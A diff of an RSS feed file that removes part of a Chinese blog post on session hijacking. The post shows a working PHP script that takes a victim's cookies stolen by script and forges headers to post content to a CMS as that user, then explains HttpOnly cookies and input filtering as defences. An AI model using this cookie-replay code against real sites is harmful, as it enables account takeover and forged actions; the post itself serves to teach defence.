-        <span class="p">}</span>
-    <span class="p">};</span> 
-    <span class="nx">head</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">js</span><span class="p">);</span>
-</pre></div>
-</code></pre>
-<p><strong>代码2.4 跨站请求简洁版</strong>
-为了真正的体现他是超链接还是跳转到一个地址为妙，所以在简洁班中脚本加载结束后做了跳转，但是为了演示方便，我们在代码2.3中没有这么做。<br>现在再点击链接<code>点击我，有惊喜！</code>，查看一下一下网络请求，会发现一个到session.myhack.com/httphack.php地址的请求，返回数据为<code>var data = {&quot;code&quot;:0};</code>。
-<img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/cross_request.jpg" alt="跨站请求">
-<strong>图2.3 跨站请求</strong></p>
-<p>接着看看httphack.php干了啥：</p>
-<pre><code class="lang-php"><div class="highlight"><pre><span class="x">    </span><span class="cp">&lt;?php</span>
-    <span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span><span class="p">);</span>
-    <span class="nx">header</span><span class="p">(</span><span class="s2">&quot;Content-type:application/javascript&quot;</span><span class="p">);</span>
-
-     <span class="k">function</span> <span class="nf">getRealIp</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">;</span>
-        <span class="nv">$ipname</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
-            <span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">,</span>
-            <span class="s1">&#39;HTTP_CLIENT_IP&#39;</span><span class="p">,</span>
-            <span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">,</span>
-            <span class="s1">&#39;HTTP_X_FORWARDED&#39;</span><span class="p">,</span>
-            <span class="s1">&#39;HTTP_X_CLUSTER_CLIENT_IP&#39;</span><span class="p">,</span>
-            <span class="s1">&#39;HTTP_FORWARDED_FOR&#39;</span><span class="p">,</span>
-            <span class="s1">&#39;HTTP_FORWARDED&#39;</span>
-        <span class="p">);</span>
-       <span class="k">foreach</span> <span class="p">(</span><span class="nv">$ipname</span> <span class="k">as</span> <span class="nv">$value</span><span class="p">)</span>
-       <span class="p">{</span>
-           <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nv">$value</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="nv">$value</span><span class="p">])</span> <span class="p">{</span>
-
-                <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="nv">$value</span><span class="p">];</span>
-                <span class="k">break</span><span class="p">;</span>
-           <span class="p">}</span>
-       <span class="p">}</span>
-       <span class="k">return</span> <span class="nv">$ip</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="nv">$ip</span> <span class="o">=</span> <span class="nx">getRealIp</span><span class="p">();</span>
-    <span class="nv">$cookies</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cook&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cook&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-    <span class="nv">$headers</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
-        <span class="s1">&#39;User-Agent:&#39;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">],</span>
-        <span class="s1">&#39;X-FORWARDED-FOR:&#39;</span><span class="o">.</span><span class="nv">$ip</span><span class="p">,</span>
-        <span class="s1">&#39;Remote-Addr:&#39;</span><span class="o">.</span><span class="nv">$ip</span><span class="p">,</span>
-        <span class="s1">&#39;Cookie:&#39;</span><span class="o">.</span><span class="nv">$cookies</span>
-    <span class="p">);</span>
-    <span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
-    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="s2">&quot;http://mycms.whyun.com/back/article/article_add.php&quot;</span><span class="p">);</span>
-    <span class="c1">// 设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上。</span>
-    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
-    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HTTPHEADER</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">);</span>  <span class="c1">//构造IP</span>
-    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_REFERER</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_REFERER&#39;</span><span class="p">]);</span>   <span class="c1">//构造来路</span>
-    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-
-    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_POST</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
-    <span class="nv">$params</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;这是跨站攻击测试&#39;</span><span class="p">,</span><span class="s1">&#39;content&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;网站被跨站攻击了&#39;</span><span class="p">);</span>
-    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_POSTFIELDS</span><span class="p">,</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$params</span><span class="p">));</span>
-
-    <span class="nv">$out</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
-    <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
-
-    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$headers</span><span class="p">);</span>
-    <span class="k">echo</span> <span class="s2">&quot;var data = </span><span class="si">$out</span><span class="s2">;&quot;</span><span class="p">;</span>
-</pre></div>
-</code></pre>
-<p><strong>代码2.5 伪造session提交</strong></p>
-<p>从代码2.5中可以看出，我们伪造了http请求的header内容，吧浏览器中mycms域的cookie原封不动传过去了，同时在header还伪造了user-agent和ip，mycms中在校验session的时候，发现sessionid和user-agent信息都是对的，所以认为session是存在且合法的！至此为止，我们完成了跨站请求攻击。</p>
-<h2><a name="3" class="anchor" href="#3"><span class="header-link"></span></a>3.防范</h2>
-<p>第二章节中，我们的攻击思路是这样的，我们示例了通过js获取cookie，然后生成一个第三方网站的网络请求，然后再从第三方网站发起一个网络请求到我们自己的网站上。整个更急流程大体是这样的：
-<img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/hack_process.png" alt="跨站请求流程"><br><strong>图3.1 跨站请求流程</strong></p>
-<p>从图3.1可以看出，让整个流程无法进行下去的措施有两个，一个就是加强对提交信息和页面显示信息的过滤，让非法提交内容无处施展；第二个就是让存储在cookie中的sessionid不能被js读取到，这样即使第一步出现漏洞的情况下，依然不会被攻击者走完整个攻击流程。<br>在php中设置sessionid的httponly属性的方法有很多，具体可以参考 stackoverflow上的一个<a href="http://stackoverflow.com/questions/36877/how-do-you-set-up-use-httponly-cookies-in-php">提问</a>。jsp中也是有很多方法，可以参考开源中国红薯发表的一篇<a href="http://www.oschina.net/question/12_72706">文章</a>。这里仅仅贴出来php中一个解决方法，就是在<code>session_start()</code>之后重新设置一下cookie:    </p>
-<pre><code class="lang-php"><div class="highlight"><pre><span class="x">    </span><span class="cp">&lt;?php</span>
-    <span class="nv">$sess_name</span> <span class="o">=</span> <span class="nb">session_name</span><span class="p">();</span><span class="c1">//必须在session_start之前调用session_name</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nb">session_start</span><span class="p">())</span> <span class="p">{</span>
-        <span class="nx">setcookie</span><span class="p">(</span><span class="nv">$sess_name</span><span class="p">,</span> <span class="nb">session_id</span><span class="p">(),</span> <span class="k">null</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
-    <span class="p">}</span>
-</pre></div>
-</code></pre>
-<p><strong>代码3.1 设置httponly属性为true</strong></p>
-<p>本文源代码地址：<a href="http://git.oschina.net/yunnysunny/hack">源码git库</a></p>
-]]></description><link>http://blog.whyun.com/posts/session/</link><guid isPermaLink="true">http://blog.whyun.com/posts/session/</guid><dc:creator><![CDATA[白一梓]]></dc:creator><pubDate>Sun, 25 May 2014 00:00:00 GMT</pubDate></item></channel></rss>
+]]></description><link>http://blog.whyun.com/posts/node/</link><guid isPermaLink="true">http://blog.whyun.com/posts/node/</guid><dc:creator><![CDATA[白一梓]]></dc:creator><pubDate>Thu, 31 Jul 2014 00:00:00 GMT</pubDate></item></channel></rss>
